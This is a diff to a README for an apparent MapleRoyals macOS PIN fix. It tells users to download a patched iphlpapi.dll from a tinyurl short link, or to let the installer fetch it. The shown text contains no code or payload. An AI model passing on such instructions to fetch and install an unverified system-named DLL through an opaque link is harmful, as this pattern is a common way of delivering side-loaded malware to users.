@@ -35,8 +35,13 @@ If that's not you, this won't do anything useful.
 4. Open your **Downloads** folder. You'll see a file called `mapleroyals-mac-pin-fix-main.zip`.
 5. **Double-click the zip** to unzip it. You'll get a folder called `mapleroyals-mac-pin-fix-main`.
 
-### Step 2 — Download the patched DLL file
+### Step 2 — Get the patched DLL file
 
+You have two ways:
+
+**Easy way:** Skip this step. The installer (Step 3) will offer to download the dll for you.
+
+**Manual way:**
 1. Open this link in your browser: **https://tinyurl.com/e633fsau**
 2. Download the file. It's called **`iphlpapi.dll`**.
 3. Leave it in your **Downloads** folder — the installer will find it there. (Or, if you prefer, drag it into the unzipped `mapleroyals-mac-pin-fix-main` folder from Step 1. Either works.)
